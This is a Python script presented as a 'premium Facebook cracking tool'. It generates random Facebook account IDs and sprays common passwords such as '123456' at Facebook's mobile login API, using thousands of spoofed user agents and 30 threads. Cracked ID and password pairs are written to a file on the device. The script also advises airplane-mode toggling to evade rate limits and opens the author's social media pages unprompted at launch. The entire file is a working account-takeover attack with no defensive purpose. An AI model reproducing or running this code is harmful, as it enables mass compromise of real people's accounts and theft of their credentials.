import os
import sys
import re
import bs4
import ssl
import json
import time
import requests
import zlib
import uuid
import base64
import certifi
import socket as _socket
import random
import string
import struct
import hashlib
import platform
import datetime
import subprocess

from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('pkg install espeak -y')

loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]

y = "\x1b[38;5;46m"
g = "\x1b[38;5;46m"
s = "\x1b[38;5;46m"
r = "\x1b[38;5;46m"
w = "\033[1;97m"

import requests, random
gt = random.choice([
    'GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045',
    'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262',
    'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192',
    'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000',
    'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040',
    'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210',
    'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325',
    'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550', 'GT-8005', 'GT-8010', 'GT-81',
    'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300',
    'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500'
])
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13'])
    c = f' TL-tl; {str(gt)}'
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])
for _ in range(10000):
    ugen.append(windows())
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.1.1', '6.0.1', '7.1.1', '12', '13', '14', '15'])
    y = random.choice([
        'SM-J320H', 'SM-J3109', 'J320FN', 'SM-J320P', 'SM-J320F', 'SM-J320G',
        'SM-J320Y'
    ])
    c = 'Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g = random.randrange(20, 100)
    h = 'Mobile Safari/537.36'
    aalhaj = (f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(aalhaj)
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8', '9', '10', '11', '12', '13', '14', '15'])
    y = random.choice([
        'RMX3571', 'RMX3511', 'RMX3461', 'RMX3741', 'RMP2107', 'RMX3572',
        'RMX1921', 'RMX3121', 'RMX3350'
    ])
    c = 'Build/TQ1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g = random.randrange(20, 100)
    h = 'Mobile Safari/537.36'
    alhajc = (f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(alhajc)
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(
        ['5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15'])
    xs = 'TECNO'
    nx = random.choice([
        'CE8', 'KG5p', 'IN6', 'IN2', 'CE9', 'IN1', 'BD4h', 'K8', 'CE7',
        'A571LS', 'BE8', 'BD4j', 'BD3', 'L6502S', 'RC6'
    ])
    c = 'Build/TQ1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40, 115)
    e = '0'
    f = random.randrange(3000, 6000)
    g = random.randrange(20, 150)
    h = 'Mobile Safari/537.36'
    alhajj = (f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(alhajj)
    
def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    for _ in range(10000):
     ugen.append(ua())
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0', '9', '10', '11', '12', '13'])
    c = 'SM-G960N Build/QP1A.190711.020; wv)'
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(73, 100)
    f = '0'
    g = random.randrange(4200, 4900)
    h = random.randrange(40, 150)
    i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
    uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for agent in range(10000):   
	aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)    
for agenku in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.0', '6.0', '7.0', '8.1.0', '9', '10', '11', '12'])
    c = random.choice(['M2101K6G', 'M2006C3MII', '2201116PG'])
    d = random.choice([
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
    ])
    e = random.randrange(1, 999)
    f = random.choice([
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
    ])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uakuh = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)
try:
    if platform.system() == "Linux":
        os.system(
            'xdg-open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('xdg-open https://wa.me/923079741690')
    elif platform.system() == "Windows":
        os.system(
            'start https://www.facebook.com/profile.php?id=100004682100211')
        os.system('start https://wa.me/923079741690')
    elif platform.system() == "Darwin":
        os.system(
            'open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('open https://wa.me/923079741690')
except: 
    pass
	    
def linex():
    print(f'\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def line():
    print(f'\r\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')



logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    ███╗░░░███╗░█████╗░░█████╗░███████╗    ║
\x1b[38;5;46m║    ████╗░████║██╔══██╗██╔══██╗╚════██║    ║
\x1b[38;5;46m║    ██╔████╔██║███████║███████║░░███╔═╝    ║
\x1b[38;5;46m║    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░    ║
\x1b[38;5;46m║    ██║░╚═╝░██║██║░░██║██║░░██║███████╗    ║
\x1b[38;5;46m║    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[38;5;46m╔═══════════════════════════════════════════╗
\x1b[38;5;46m║     \033[1;97m[ PREMIUM FACEBOOK CRACKING TOOL ]     \x1b[38;5;46m║
\x1b[38;5;46m╚═══════════════════════════════════════════╝

\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+923079741690
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv2.2 PREMIUM
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


def clear():
    os.system('clear')
    print(logo)


def main():
    clear()
    os.system('espeak -a 300 "Welcome to MAAZ tools"')

    animation = [
        "[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]",
        "[\x1b[38;5;46m■■\033[1;97m□□□□□□□□]",
        "[\x1b[38;5;46m■■■\033[1;97m□□□□□□□]",
        "[\x1b[38;5;46m■■■■\033[1;97m□□□□□□]",
        "[\x1b[38;5;46m■■■■■\033[1;97m□□□□□]",
        "[\x1b[38;5;46m■■■■■■\033[1;97m□□□□]",
        "[\x1b[38;5;46m■■■■■■■\033[1;97m□□□]",
        "[\x1b[38;5;46m■■■■■■■■\033[1;97m□□]",
        "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
        "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
    ]
    os.system('espeak -a 300 "Thanks for using MAAZ tools"')
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \x1b[38;5;46mLOADING...\033[1;97m "
            + animation[i % len(animation)] + "\033[1;97m ")
        sys.stdout.flush()

    clear()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mSERIES SELECTION \x1b[38;5;46m[\x1b[38;5;46mSeries\x1b[38;5;46m/\x1b[38;5;46mBased\x1b[38;5;46m]\033[1;97m')
    linex()
    ch = input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')

    if ch in ('1', '01', '11', 'a', 'A'):
        SERIES_SELECTION()
    

def SERIES_SELECTION():
    user = []
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECT SERIES FOR CLONING:')
    linex()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97m100000 Series')
    print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97m100001 Series')
    print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m100002 Series')
    print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m100003 Series')
    print(f'\x1b[38;5;46m[\033[1;97m5\x1b[38;5;46m] \033[1;97m100004 Series')
    print(f'\x1b[38;5;46m[\033[1;97m6\x1b[38;5;46m] \033[1;97m100005 Series')
    print(f'\x1b[38;5;46m[\033[1;97m7\x1b[38;5;46m] \033[1;97m100006 Series')
    print(f'\x1b[38;5;46m[\033[1;97m8\x1b[38;5;46m] \033[1;97m100007 Series')
    print(f'\x1b[38;5;46m[\033[1;97m9\x1b[38;5;46m] \033[1;97m100008 Series')
    linex()
    
    series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
    
    # Simple series mapping - just the selected code
    series_map = {
        '1': '100000',
        '2': '100001', 
        '3': '100002',
        '4': '100003',
        '5': '100004',
        '6': '100005',
        '7': '100006',
        '8': '100007',
        '9': '100008'
    }
    
    if series_choice in series_map:
        selected_series = series_map[series_choice]
        START_SERIES_CLONING(selected_series)
    else:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
        time.sleep(2)
        SERIES_SELECTION()

def START_SERIES_CLONING(series_code):
    user = []
    clear()
    
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECTED SERIES: \x1b[38;5;46m{series_code}')
    print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
    linex()
    
    # Generate IDs with selected series code (15 digits total)
    for i in range(5000):
        uid = series_code + ''.join(random.choices(string.digits, k=9))
        user.append(uid)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
        linex()
        for mal in user:
            uid = mal
            jihad.submit(login1, uid)
    
    line()
    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
    linex()
    print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks) if 'oks' in globals() else 0}")
    linex()
    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
    main()


def login1(uid):
    global oks, loop, cps
    Session = requests.session()
    try:
        sys.stdout.write(
            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
        )
        sys.stdout.flush()
        ua = random.choice(ugen)    
        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token':
                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class':
                'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            head = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id':
                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Length': '706'
            }
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,
                               data=data,
                               headers=head,
                               allow_redirects=False,
                               verify=True).json()
            if "session_key" in rp:            	
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/OLD_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)

if __name__ == "__main__":
    main()
